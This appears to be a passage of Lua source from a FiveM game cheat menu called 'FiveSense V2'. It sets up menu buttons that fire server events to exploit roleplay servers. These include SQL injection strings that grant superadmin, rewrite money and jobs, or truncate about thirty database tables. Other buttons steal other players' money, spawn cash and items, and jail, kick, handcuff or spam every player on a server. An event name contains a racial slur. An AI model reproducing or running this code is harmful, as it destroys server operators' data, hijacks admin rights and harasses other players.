               sum.f.checkbox('teleport-zombies', 'Teleport Zombies', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('auto-lootzombies', 'Auto Loot Zombies', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('teleport-zombies-invisible', 'Invisible Zombies', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('kill-zombies', 'Kill Zombies', 0.51, y) 
           end y = y + add  
           --[[if y >= 0.385 and y <= max then 
               sum.f.checkbox('glife-autoloot', 'Auto Loot', 0.51, y) 
           end y = y + add  ]]
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('auto-kill-zombies', 'XP Farm', 0.51, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
                   if sum.f.button('XP Farm Range', 0.51, y) then
               end y = y + add 
           end
   
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['glife-xpfarm-distance'], 0.51, y)
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('oneshot-zombies', 'Oneshot Zombies', 0.51, y) 
           end y = y + add  
       end
   
   
       if sum.f.tab == 'lua' then 
           local y = 0.387+sum.st['lua'].static
           local add = 0.0155
           local max = 0.65+dH/1.06
       
   
           sum.f.separator('Dynamic Trigger', 0.3875, y) y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('</font><font color="#FF0000">Load Dynamic Triggers</font>', 0.3875, y) then 
                   sum.f.UpdateAllTriggers()
                   sum.f.sendNotification('Searching for dynamic triggers!', 'Lua')
               end
           end y = y + add
   
           sum.f.separator('Self Triggers', 0.3875, y) y = y + add 
   
           if sum.TR['esx_skin:openSaveableMenu'] and y >= 0.385 and y <= max  then
               if sum.f.button('Skin menu', 0.3875, y)  then
                   sum.f.TriggerCustomEvent(false, 'esx_skin:openSaveableMenu')
               end y = y + add
           end
   
           if sum.TR['esx_ambulancejob_revive']  and y >= 0.385 and y <= max then
               if sum.f.button('Revive', 0.3875, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['esx_ambulancejob_revive'])
               end y = y + add
           end
   
           
           if sum.TR['esx_policejob_unrestrain']  and y >= 0.385 and y <= max then
               if sum.f.button('Uncuff', 0.3875, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['esx_policejob_unrestrain'])
               end y = y + add
           end
   
           if sum.TR['esx']  and y >= 0.385 and y <= max then
               if sum.f.button('Revive', 0.3875, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['esx'])
               end y = y + add
           end
   
           if sum.TR['esx_karlosmuertos_niggaleaksjenej']  and y >= 0.385 and y <= max then
               if sum.f.button('Revive', 0.3875, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['esx_karlosmuertos_niggaleaksjenej'])
               end y = y + add
           end
   
           if sum.TR['delete_DB'] and y >= 0.385 and y <= max then
               if sum.f.button('TRY To Set Player To Super Admin', 0.3875, y) then
                   local last = sum.f.kinput('Your Last Character Name', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['delete_DB'], '\';UPDATE users SET permission_level=\'1000\' WHERE `lastname`=\''.. last ..'\';/')
                   sum.f.TriggerCustomEvent(true, sum.TR['delete_DB'], '\';UPDATE users SET `group` = \'superadmin\' WHERE `lastname`=\''.. last ..'\';/')
               end
               y = y + add
           end
   
           if sum.TR['delete_DB'] and y >= 0.385 and y <= max then
               if sum.f.button('TRY To Set Player Job', 0.3875, y) then
                   local last = sum.f.kinput('Your Last Character Name', '', 100)
                   local jobtit = sum.f.kinput('Job Name', '', 100)
                   local jobgra = sum.f.kinput('Job Grade', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['delete_DB'], '\';UPDATE users SET `job`=\''.. jobtit ..'\' WHERE `lastname`=\''.. last ..'\';/')
                   sum.f.TriggerCustomEvent(true, sum.TR['delete_DB'], '\';UPDATE users SET `job_grade` = \''.. jobgra ..'\' WHERE `lastname`=\''.. last ..'\';/')
               end
               y = y + add
           end
   
   
           if sum.TR['esx_status_refillstatus'] and y >= 0.385 and y <= max then
               if sum.f.button('Add Water and Hunger', 0.3875, y) then
                   sum.f.TriggerCustomEvent(false, sum.TR['esx_status_refillstatus'], 'hunger', 1000000)
                   sum.f.TriggerCustomEvent(false, sum.TR['esx_status_refillstatus'], 'thirst', 1000000)
               end
               y = y + add
           end
   
           if sum.TR['qalle_unjail'] and y >= 0.385 and y <= max then
               if sum.f.button('Un-Jail', 0.3875, y) then
                   sum.f.TriggerCustomEvent(true, sum.TR['qalle_unjail'], 1)
               end
               y = y + add
           end
   
           if sum.TR['communityservice_finishservice'] and y >= 0.385 and y <= max then
               if sum.f.button('Finish Community Service', 0.3875, y) then
                   sum.f.TriggerCustomEvent(true, sum.TR['community'], -1)
               end
               y = y + add
           end
   
           if sum.TR['dmv_getlicense'] and y >= 0.385 and y <= max then
               if sum.f.button("Add All Driving Licences", 0.3875, y) then
                   sum.f.TriggerCustomEvent(true, sum.TR['dmv_getlicense'], 'dmv')
                   sum.f.TriggerCustomEvent(true, sum.TR['dmv_getlicense'], 'drive')
                   sum.f.TriggerCustomEvent(true, sum.TR['dmv_getlicense'], 'drive_bike')
                   sum.f.TriggerCustomEvent(true, sum.TR['dmv_getlicense'], 'drive_truck')
               end
               y = y + add
           end
   
   
   
           if sum.TR['vehicleshop_ownedveh'] and y >= 0.385 and y <= max then
               if sum.f.button("Give Vehicle To Garage", 0.3875, y) then
                   local model = sum.f.kinput('Car Model', '', 30)
                   if sum.f.IsModelValid(model) and sum.f.IsModelAVehicle(model) then
                       local plate = sum.f.kinput('Plate', '', 8)
                       sum.f.TriggerCustomEvent(true, sum.TR['vehicleshop_ownedveh'], {['model'] = sum.f.GetHashKey(tostring(model)), ['plate'] = tostring(plate)})
                   else
                   end
               end
               y = y + add
           end
   
           sum.f.separator('Grief Triggers', 0.3875, y) y = y + add 
   
           if sum.TR['qalle_jailer'] and y >= 0.385 and y <= max then
               if sum.f.button('Jail', 0.3875, y) then
                   local person = sum.f.kinput('Player ID or Y for all', '', 4)
                   local reason = sum.f.kinput('Reason', 'get good get five^2sense^0', 100)
                   if string.lower(person) == 'y' then
                       for k, v in pairs(sum.f.GetActivePlayers()) do
                           sum.f.TriggerCustomEvent(true, sum.TR['qalle_jailer'], tonumber(v), 1337, reason)
                       end
                   if reason == nil then reason = 'get good get five^2sense^0' end
                           sum.f.TriggerCustomEvent(true, sum.TR['qalle_jailer'], tonumber(person), 1337, reason)
                       end
                   end
                   y = y + add
               end
           if sum.TR['esx_worek_sendclosest'] and y >= 0.385 and y <= max then
               if sum.f.button('HeadBag Players', 0.3875, y) then
                   local person = sum.f.kinput('Player ID or Y for all', '', 4)
                   if string.lower(person) == 'y' then
                       for k, v in pairs(sum.f.GetActivePlayers()) do
                           sum.f.TriggerCustomEvent(true, sum.TR['esx_worek_sendclosest'], tonumber(v))
                       end
                           sum.f.TriggerCustomEvent(true, sum.TR['esx_worek_sendclosest'], tonumber(person))
                       end
                   end
                   y = y + add
               end
   
           if sum.TR['esx_spectate_kick'] and y >= 0.385 and y <= max then
               if sum.f.button('Kick Players', 0.3875, y) then
                   local person = sum.f.kinput('Player ID or Y for all', '', 4)
                   local reason = sum.f.kinput('Reason', '', 100)
                   if string.lower(person) == 'y' then
                       for k, v in pairs(sum.f.GetActivePlayers()) do
                           sum.f.TriggerCustomEvent(true, sum.TR['esx_spectate_kick'], tonumber(v), reason)
                       end
                           sum.f.TriggerCustomEvent(true, sum.TR['esx_spectate_kick'], tonumber(person), reason)
                       end
                   end
                   y = y + add
               end
   
           if sum.TR['esx_policejob_handcuf'] and y >= 0.385 and y <= max then
               if sum.f.button('Handcuff Players', 0.3875, y) then
                   local person = sum.f.kinput('Player ID or Y for all', '', 4)
                   if string.lower(person) == 'y' then
                       for k, v in pairs(sum.f.GetActivePlayers()) do
                           sum.f.TriggerCustomEvent(true, sum.TR['esx_policejob_handcuf'], tonumber(v))
                       end
                       sum.f.TriggerCustomEvent(true, sum.TR['esx_policejob_handcuf'], tonumber(person))
                   end
               end
               y = y + add
           end
   
           if sum.TR['esx_policejob_drag'] and y >= 0.385 and y <= max then
               if sum.f.button('Drag Players', 0.3875, y) then
                   local person = sum.f.kinput('Player ID or Y for all', '', 4)
                   if string.lower(person) == 'y' then
                       for k, v in pairs(sum.f.GetActivePlayers()) do
                           sum.f.TriggerCustomEvent(true, sum.TR['esx_policejob_drag:drag'], tonumber(v))
                       end
                       sum.f.TriggerCustomEvent(true, sum.TR['esx_policejob_drag:drag'], tonumber(person))
                   end
               end
               y = y + add
           end
   
           if sum.TR['vodka_bag_ApplyBag'] and y >= 0.385 and y <= max then
               if sum.f.button('HeadBag All', 0.3875, y) then
                   local person = sum.f.kinput('Player ID or Y for all', '', 4)
                   if string.lower(person) == 'y' then
                           for k, v in pairs(sum.f.GetActivePlayers()) do
                           sum.f.TriggerCustomEvent(true, sum.TR['vodka_bag_ApplyBag'], tonumber(v))
                       end
                       sum.f.TriggerCustomEvent(true, sum.TR['vodka_bag_ApplyBag'], tonumber(person))
                   end
               end
               y = y + add
           end
   
           if sum.TR['community'] and y >= 0.385 and y <= max then
               if sum.f.button('Community Service', 0.3875, y) then
                   local person = sum.f.kinput('Player ID or Y for all', '', 4)
                   if string.lower(person) == 'y' then
                       for k, v in pairs(sum.f.GetActivePlayers()) do
                           sum.f.TriggerCustomEvent(true, sum.TR['community'], tonumber(v), "get good get five^2sense^0")
                       end
                       sum.f.TriggerCustomEvent(true, sum.TR['community'], tonumber(person), "get good get five^2sense^0")
                   end
               end
               y = y + add
           end
   
           if sum.TR['police_exploit'] and y >= 0.385 and y <= max then
               if sum.f.button('Message Spammer', 0.3875, y) then
                   local amount = sum.f.kinput('Loop', '', 3)
                   local message = sum.f.kinput('Message', 'get good get fivesense', 10000)
                   sum.curak.thr(function()
                       for i = 1, tonumber(amount) do
                           sum.f.TriggerCustomEvent(true, sum.TR['police_exploit'], -1, ''..i..' '..message..'')
                           sum.curak.wait(60)
                       end
                       return
                   end)
               end
               y = y + add
           end
           if sum.TR['send_bill'] and y >= 0.385 and y <= max then
               if sum.f.button('Send Everyone a Bill', 0.3875, y) then
                   local amount = sum.f.kinput('Loop', '', 3)
                   local message = sum.f.kinput('Message', 'get good get fivesense', 100)
                   local amount2 = sum.f.kinput('Amount', '', 30)
                   sum.curak.thr(function()
                       local activeplayers = sum.f.GetActivePlayers()
                       for k, v in pairs(activeplayers) do
                           for i = 1, amount do
                               sum.curak.wait(60)
                               sum.f.TriggerCustomEvent(true, sum.TR["send_bill"], sum.f.GetPlayerServerId(v), "FiveSense V2", message, amount2)
                           end
                           sum.curak.wait(100)
                       end
                       return
                   end)
               end
               y = y + add
           end
   
           if sum.TR['gcphone_posttweet'] and sum.TR['gcphone_createtwiteracc'] and sum.TR['gcphone_logintwitteracc'] and y >= 0.385 and y <= max then
               if sum.f.button("Spam Twitter", 0.3875, y) then
                   local amount = sum.f.kinput('Amount To Send', '', 3)
                   local text = sum.f.kinput('Message', 'get good get fivesense', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['gcphone_createtwiteracc'], 'FiveSense', 'sum23', 'https://cdn.discordapp.com/icons/865852407455809546/a_8399d6984af089629999e87f10434681.gif?size=4096')
                   sum.f.TriggerCustomEvent(true, sum.TR['gcphone_logintwitteracc'], 'FiveSense', 'sum23')
                   if text == nil then text = 'get good get five^2sense^0' end
                   sum.curak.thr(function()
                       for i = 1, tonumber(amount) do
                           sum.curak.wait(60)
                           sum.f.TriggerCustomEvent(true, sum.TR['gcphone_posttweet'], 'FiveSense', 'sum23', text)
                       end
                       return
                   end)
               end
               y = y + add
           end
           if sum.TR['tp_all_to_me'] and y >= 0.385 and y <= max then
               if sum.f.button('Teleport Everyone To Me', 0.3875, y) then
                   sum.f.TriggerCustomEvent(true, sum.TR['tp_all_to_me'], -1)
               end
               y = y + add
           end
           if sum.TR['carry_exploit'] and y >= 0.385 and y <= max then
               if sum.f.button('Carry Everyone', 0.3875, y) then
                   sum.curak.thr(function()
                       for k, v in pairs(sum.f.GetActivePlayers()) do
                           if sum.f.GetPlayerPed(v) ~= sum.f.PlayerPedId() then 
                               sum.f.TriggerCustomEvent(true, sum.TR['carry_exploit'], sum.f.GetPlayerPed(v), 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, sum.f.GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                               sum.curak.wait(10)
                           end
                       end
                       return
                   end)
               end
               y = y + add
           end
           
           if sum.TR['play_da_sound'] and y >= 0.385 and y <= max then
               if sum.f.button("Play a Song", 0.3875, y) then
                   local song = sum.f.kinput("Enter YT Link, ?v=~r~dQw4w9WgXcQ", 'dQw4w9WgXcQ', 100)
                   for k, v in pairs(sum.f.GetActivePlayers()) do 
                       local personC = sum.f.GetEntityCoords(sum.f.GetPlayerPed(v))
                       sum.f.TriggerCustomEvent(true, sum.TR['play_da_sound'], song, personC)
                   end
               end
               y = y + add
           end
   
           if sum.TR['Hostage_Exploit'] and y >= 0.385 and y <= max then
               if sum.f.button('Take Everyone As Hostage', 0.3875, y) then
                   sum.curak.thr(function()
                       for k, v in pairs(sum.f.GetActivePlayers()) do
                           if sum.f.GetPlayerPed(v) ~= sum.f.PlayerPedId() then 
                               sum.f.TriggerCustomEvent(true, sum.TR['Hostage_Exploit'], sum.f.GetPlayerPed(v), 'anim@gangops@hostage@', 'anim@gangops@hostage@', 'perp_idle', 'victim_idle', 0.11, -0.24, 0.0, sum.f.GetPlayerServerId(v), 100000, 0.0, 49, 49, 50, true)
                               sum.curak.wait(10)
                           end
                       end
                       return
                   end)
               end
               y = y + add
           end
           if sum.TR['delete_DB'] and y >= 0.385 and y <= max then
               if sum.f.button('Delete Database', 0.3875, y) then
                   sum.curak.thr(function()
                       local sqltable = {'addon_account','addon_account_data','addon_inventory','addon_inventory_items','billing','charicters','datastore','datastore_data','fine_types','items','jobs','job_grades','licenses','owned_properties','phone_app_chat','phone_calls','phone_messages','phone_users_contacts','properties','rented_vehicles','shops','society_moneywash','users','user_accounts','user_inventory','user_licenses','vehicles','vehicle_categories','vehicle_sold','weashops'}
                       for key, value in pairs(sqltable) do
                           sum.curak.wait(25)
                           sum.f.TriggerCustomEvent(true, sum.TR['delete_DB'], '\';TRUNCATE TABLE '..value..';-- /')
                       end
                       return
                   end)
               end
               y = y + add
           end
   
           local y = 0.387+sum.st['lua'].static2
   
           sum.f.separator('Money Triggers', 0.51, y) y = y + add
   
           if sum.TR['esx_inventoryhud_tradePlayerItems'] and y >= 0.385 and y <= max then
               if sum.f.button('Steal Money', 0.51, y) then
               for i, player in pairs(sum.f.GetActivePlayers()) do
                   local id = sum.f.GetPlayerServerId(player)
                   local amount = sum.s['steal-money'].value
                   sum.f.TriggerCustomEvent(true, sum.TR['esx_inventoryhud_tradePlayerItems'],id,sum.f.GetPlayerServerId(sum.f.PlayerId()),"item_money","", tonumber(amount))
               end y = y + add
               if y >= 0.385 and y <= max then 
                   sum.f.slider(sum.s['steal-money'], 0.51, y)
               end y = y + add
           end
       end
   
       if sum.TR['esx_poolcleaner_GiveItem'] and y >= 0.385 and y <= max then
           if sum.f.button('Give Money - Pool Cleaner', 0.51, y) then
               local amount = sum.f.kinput('Amount', '', 100)
               sum.f.TriggerCustomEvent(true, sum.TR['esx_poolcleaner_GiveItem'], tonumber(amount))
               sum.f.TriggerCustomEvent(true, sum.TR['esx_poolcleaner_startVente'], tonumber(amount))
               sum.f.TriggerCustomEvent(true, sum.TR['esx_poolcleaner_stopVente'], tonumber(amount))        
           end
           y = y + add
       end
   
       if sum.TR['esx_windowcleaner_startVente'] and y >= 0.385 and y <= max then
           if sum.f.button('Give Money - Window Cleaner', 0.51, y) then
               local amount = sum.f.kinput('Amount', '', 100)
               sum.f.TriggerCustomEvent(true, sum.TR['esx_windowcleaner_GiveItem'], tonumber(amount))
               sum.f.TriggerCustomEvent(true, sum.TR['esx_windowcleaner_startVente'], tonumber(amount))
               sum.f.TriggerCustomEvent(true, sum.TR['esx_windowcleaner_stopVente'], tonumber(amount))
           end
           y = y + add
       end
   
           if sum.TR['ESX_BUSS_PAY'] and y >= 0.385 and y <= max then
               if sum.f.button('Give Money - Bus', 0.51, y) then
                   local amount = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['ESX_BUSS_PAY'], tonumber(amount))
               end
               y = y + add
           end
           if sum.TR['driftcounter_payDrift'] and y >= 0.385 and y <= max then
               if sum.f.button('Give Money - Drift', 0.51, y) then
                   local amount = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['driftcounter_payDrift'], tonumber(amount))
               end
               y = y + add
           end
           if sum.TR['truckerjob_pay'] and y >= 0.385 and y <= max then
               if sum.f.button('Give Money - Trucker', 0.51, y) then
                   local amount = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['truckerjob_pay'], tonumber(amount))
               end
               y = y + add
           end
           if sum.TR['esx_mugging_giveMoney'] and y >= 0.385 and y <= max then
               if sum.f.button('Give Money - Mugger', 0.51, y) then
                   sum.f.TriggerCustomEvent(true, sum.TR['esx_mugging_giveMoney'])
               end
               y = y + add
           end
           if sum.TR['gopostal_pay'] and y >= 0.385 and y <= max then
               if sum.f.button("Give Money - Postal", 0.51, y) then
                   local plate = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['gopostal_pay'], tonumber(plate))
               end
               y = y + add
           end
           if sum.TR['garbagejob_pay'] and y >= 0.385 and y <= max then
               if sum.f.button("Give Money - Garbage", 0.51, y) then
                   local plate = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['garbagejob_pay'], tonumber(plate))
               end
               y = y + add
           end
           if sum.TR['baz_moneywash_retrieveMoney'] and y >= 0.385 and y <= max then
               if sum.f.button("Wash Money", 0.51, y) then
                   local amount = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['baz_moneywash_retrieveMoney'], "first", tonumber(amount))
               end
               y = y + add
           end
           if sum.TR['Money_Wash'] and y >= 0.385 and y <= max then
               if sum.f.button("Wash Money", 0.51, y) then
                   local amount = sum.f.kinput('Amount', '', 100)
                   local zone = {}
                   sum.f.TriggerCustomEvent(true, sum.TR['Money_Wash'], tonumber(amount), zone)
               end
               y = y + add
           end
           if sum.TR['vangelico_get'] and sum.TR['vangelico_sell'] and y >= 0.385 and y <= max then
   
               if sum.f.button('Vangelico Robbery', 0.51, y) then
                   local amountlooper = sum.f.kinput('Loop', '', 100)
                   sum.curak.thr(function()
                       for i = 1, tonumber(amountlooper) do
                           sum.f.TriggerCustomEvent(true, sum.TR['vangelico_get'])
                           sum.curak.wait(100)
                           sum.f.TriggerCustomEvent(true, sum.TR['vangelico_sell'])
                       end
                       return
                   end)
               end
               y = y + add
           end
           if sum.TR['delete_DB'] and y >= 0.385 and y <= max then
               if sum.f.button('Set Cash Money DB', 0.51, y) then
                   local last = sum.f.kinput('Your Last Character Name', '', 30)
                   local amount = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['delete_DB'], '\';UPDATE users SET `money` = '.. amount ..' WHERE `lastname`=\''.. last ..'\';/')
               end
               y = y + add
           end
           if sum.TR['delete_DB']  and y >= 0.385 and y <= max then
               if sum.f.button('Set Bank Money DB', 0.51, y) then
                   local last = sum.f.kinput('Your Last Character Name', '', 30)
                   local amount = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['delete_DB'], '\';UPDATE users SET `bank` = '.. amount ..' WHERE `lastname`=\''.. last ..'\';/')
               end
               y = y + add
           end
           if sum.TR['Money_Wash'] and sum.TR['Money_Wash_Zone'] and y >= 0.385 and y <= max then
               if sum.f.button('Wash Dirty Money', 0.51, y) then
                   local amount = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['Money_Wash'], amount, sum.TR['Money_Wash_Zone'])
               end
               y = y + add
           end
           
           if sum.TR['Money_Wash'] == nil and sum.TR['Money_Wash_Zone'] == nil and sum.TR['Money_Wash_Old'] and y >= 0.385 and y <= max then
               if sum.f.button('Wash Dirty Money', 0.51, y) then
                   local amount = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['Money_Wash_Old'], amount)
               end
               y = y + add
           end
   
           if sum.TR['dmv_pay'] and y >= 0.385 and y <= max then
               if sum.f.button('Remove Money', 0.51, y) then
                   local amount = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['dmv_pay'], tonumber(amount))
               end
               y = y + add
           end
   
           sum.f.separator('Item Triggers', 0.51, y) y = y + add 
   
   
           if sum.TR['giveitem']  and y >= 0.385 and y <= max then
               if sum.f.button('Give item', 0.51, y)  then
                   local item =  sum.f.kinput('Item to give', '', 30)
                   sum.f.TriggerCustomEvent(true, sum.TR['giveitem'], item)
               end y = y + add
           end
           if sum.TR['esx_mugging_giveItems']  and y >= 0.385 and y <= max then
               if sum.f.button('Give item', 0.51, y)  then
                   local item =  sum.f.kinput('Item to give', '', 30)
                   sum.f.TriggerCustomEvent(true, sum.TR['esx_mugging_giveItems'], item)
               end y = y + add
           end
           if sum.TR['giveitem2'] and y >= 0.385 and y <= max  then
               if sum.f.button('Give item', 0.51, y)  then
                   local item = sum.f.kinput('Item to give', '', 30)
                   local ammount = sum.f.kinput('Ammount', '', 30)
                   sum.f.TriggerCustomEvent(true, sum.TR['giveitem2'], item, ammount)
               end y = y + add
           end
           
           if sum.TR['open_inv_ghetto'] and y >= 0.51 and y <= max then
               if sum.f.button("Open Someone's Inventory", 0.51, y) then
                   local last = sum.f.kinput("Player ID", '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['open_inv_ghetto'], "otherplayer", last)
               end
               y = y + add
           end
   
           if sum.TR['linden_inventory'] and y >= 0.51 and y <= max then
               if sum.f.button("Open Someone's Inventory", 0.51, y) then
                   local last = sum.f.kinput("Player ID", '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['linden_inventory'], sum.f.GetPlayerServerId(last))
               end
               y = y + add
           end
   
   
           if sum.TR['free_items'] and y >= 0.51 and y <= max then
               if sum.f.button('Give Items', 0.51, y) then
                   local item = sum.f.kinput('Item', '', 100)
                   local amount = sum.f.kinput('Amount', '', 100)
                   sum.f.TriggerCustomEvent(true, sum.TR['free_items'], tostring(item), tonumber(amount))
               end
               y = y + add
           end
   
           sum.f.separator('Drugs Triggers', 0.51, y) y = y + add 
   
           if sum.TR['drugs:stop_sell_opium'] and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - STOP ALL', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:stop_sell_opium'])
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:drugs:stop_process_opium'])
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:stop_feild_opium'])
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:stop_sell_weed'])
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:stop_feild_weed'])
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:stop_sell_meth'])
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:stop_process_meth'])
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:stop_feild_meth'])
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:stop_sell_coke'])
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:stop_process_coke'])
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:stop_feild_coke'])
               end y = y + add
           end
           if sum.TR['drugs:opiumsell'] and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Sell Opium', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:opiumsell'])
               end y = y + add
           end
           if sum.TR['drugs:opiumprocess'] and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Process Opium', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:opiumprocess'])
               end y = y + add
           end
           if sum.TR['drugs:opiumfield'] and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Field Opium', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:opiumfield'])
               end y = y + add
           end
           if sum.TR['drugs:weedsell'] and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Sell wead', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:weedsell'])
               end y = y + add
           end
           if sum.TR['drugs:weedprocess'] and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Process wead', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:weedprocess'])
               end y = y + add
           end
           if sum.TR['drugs:weedfield'] and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Field wead', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['drugs:weedfield'])
               end y = y + add
           end
           if sum.TR['coke_feild'] and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Field Coke', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['coke_feild'])
               end y = y + add
           end
           if sum.TR['coke_process'] and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Process Coke', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['coke_process'])
               end y = y + add
           end
           if sum.TR['coke_sell']  and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Sell Coke', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['coke_sell'])
               end y = y + add
           end
   
           if sum.TR['meth_field']  and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Field Meth', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['meth_field'])
               end y = y + add
           end
           if sum.TR['meth_process']  and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Process Meth', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['meth_process'])
               end y = y + add
           end
           if sum.TR['meth_sell']  and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Sell Meth', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['meth_sell'])
               end y = y + add
           end
           if sum.TR['stop_feild_coke']  and y >= 0.385 and y <= max then
               if sum.f.button('Drugs - Stop All', 0.51, y)  then
                   sum.f.TriggerCustomEvent(true, sum.TR['stop_feild_coke'])
                   sum.f.TriggerCustomEvent(true, sum.TR['stop_process_coke'])
                   sum.f.TriggerCustomEvent(true, sum.TR['stop_sell_coke'])
                   sum.f.TriggerCustomEvent(true, sum.TR['stop_feild_meth'])
                   sum.f.TriggerCustomEvent(true, sum.TR['stop_process_meth'])
                   sum.f.TriggerCustomEvent(true, sum.TR['stop_sell_meth'])
               end y = y + add
           end
           
       end
   
       if sum.f.tab == 'settings' then 
           local y = 0.387+sum.st['settings'].static
           local add = 0.0155
           local max = 0.65+dH/1.06
           sum.f.separator('Settings', 0.3875, y) y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.button('Menu Color', 0.3875, y)  
               if sum.f.pickerbutton(sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 0.3875, y) then 
                   sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value = sum.f.ColorPicker(sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value)
                   if sum.f.IsControlJustPressed(0, 18) then sum.f.sendNotification('Changed Menu Color To: R: '..sum.s['menu-r'].value..' G: '..sum.s['menu-g'].value.. ' B: '..sum.s['menu-b'].value, 'Menu Color') end
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.button('Checkbox Color', 0.3875, y)  
               if sum.f.pickerbutton(sum.s['checkbox-r'].value, sum.s['checkbox-g'].value, sum.s['checkbox-b'].value, 0.38, y) then 
                   sum.s['checkbox-r'].value, sum.s['checkbox-g'].value, sum.s['checkbox-b'].value = sum.f.ColorPicker(sum.s['checkbox-r'].value, sum.s['checkbox-g'].value, sum.s['checkbox-b'].value)
               end
               if sum.f.pickerbutton(sum.s['checkbox-check-r'].value, sum.s['checkbox-check-g'].value, sum.s['checkbox-check-b'].value, 0.3875, y) then 
                   sum.s['checkbox-check-r'].value, sum.s['checkbox-check-g'].value, sum.s['checkbox-check-b'].value = sum.f.ColorPicker(sum.s['checkbox-check-r'].value, sum.s['checkbox-check-g'].value, sum.s['checkbox-check-b'].value)
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.button('Combo Arrows Color', 0.3875, y)  
               if sum.f.pickerbutton(sum.s['combo-arrow-r'].value, sum.s['combo-arrow-g'].value, sum.s['combo-arrow-b'].value, 0.3875, y) then 
                   sum.s['combo-arrow-r'].value, sum.s['combo-arrow-g'].value, sum.s['combo-arrow-b'].value = sum.f.ColorPicker(sum.s['combo-arrow-r'].value, sum.s['combo-arrow-g'].value, sum.s['combo-arrow-b'].value)
               end
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('Menu Keybind', 0.3875, y) then 
                   local text, value = sum.m.input('Open Key', '', 1, true)
                   sum['OpenMenu'] = sum.keys[text]
               end
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('</font><font color="#FF0000">Kill Menu</font>', 0.3875, y) then 
                   sum.menu = false
               end
           end y = y + add
           sum.f.separator('Separator Config', 0.3875, y) y = y + add 
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('settings-corner', 'Boxes', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
